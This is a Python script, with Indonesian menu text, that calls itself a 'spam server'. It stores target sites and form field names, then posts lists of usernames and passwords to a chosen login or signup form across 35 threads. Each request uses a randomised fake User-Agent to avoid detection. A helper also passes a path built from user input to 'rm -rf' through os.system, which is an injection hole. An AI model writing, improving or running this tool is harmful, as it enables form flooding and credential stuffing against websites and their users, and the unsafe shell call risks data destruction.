import os, json, requests, time
from sys import stdout
from random import choice as rd
from faker import Faker
from concurrent.futures import ThreadPoolExecutor as tp
P = '\033[0m'
H = '\033[0;91m'
G = '\033[0;92m'
K = '\033[0;93m'
L = P+'~'*29
R = [P,H,G,K]
V = '{}[{}?{}]{} '.format(G,K,G,P)
fake = Faker()

def Ban():
	Ban='''
-----------------------------
  _   _   _   _   _   _   _  
 / \ / \ / \ / \ / \ / \ / \ 
( {}B {}| {}O {}| {}T {}| {}S {}| {}P {}| {}A {}| {}M {})
 \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
-----------------------------
         {}=[{} SERVER {}]=
{}
{}[-] {}S P A M   S E R V E R {}[-]
{}{}
'''.format(rd(R),P,rd(R),P,rd(R),P,rd(R),P,rd(R),P,rd(R),P,rd(R),P,G,rd(R),G,L,K,P,K,P,L)
	for x in Ban:
		stdout.write(x)
		stdout.flush()
		time.sleep(0.01)
		Menu()

def Menu():
	global dat,i,ttl
	u=1	
	Tgt=[]
	print('{}\n[{}=={}] Daftar Menu Target [{}=={}]\n{}'.format(L,K,P,K,P,L))
	for A in os.listdir('Url/'):
		print('{}[{}{}{}] {}'.format(G,P,u,P,A))
		Tgt.append(A)
		u +=1
	print('''{}[{}9{}] {}Tambah Target Baru
{}[{}0{}] {}Keluar Exit
{}'''.format(G,P,G,P,G,H,G,P,L))
	Pl=input(V+' Pilih Target : ')
	print(L)
	if Pl == '9':
			Tambah()
	elif Pl == '0':
			exit()
	else:
		Ta=Tgt[int(Pl)-1]
		dat = open('Url/%s'%Ta).read()
		dat=dat.split()
		Us=open('us.txt').read().splitlines()
		Pa=open('pa.txt').read().splitlines()
		ttl=len(Pa)
		try:
			tp(35).map(Sweb, (Us),(Pa))
			exit()
		except Exception as err:
			print('[!] Kesalahan => %s'%err)
		

def Tambah():
	Ur=input(V+'Url Target : ')
	Un=input(V+'Nma Target : ')
	Usu=input(V+'Use Target : ')
	Pap=input(V+'Pas Target : ')
	with open('Url/'+Un,'w') as f:
		f.write('{}\n{}\n{}'.format(Ur,Usu,Pap))

def Hapus(Tgt,Pl):
	os.system('rm -rf Url/'+Tgt[int(Pl)-1])
	return Menu

def Sweb(Us,Pa):
	global i
	try:
		r=requests.post(dat[0], data={dat[1]:Us, dat[2]:Pa}, headers={'User-Agent':fake.user_agent()}).url
		stdout.write('\r{}[{}{}{}/{}{}]{} {} | {}'.format(G,P,i,H,P,ttl,G,P, Us,Pa))
		i+=1
		return Us,Pa
	except Exception as err:
		print(err)

if __name__=='__main__':
	i=1
	Ban()
	Menu()
	print('='*33)
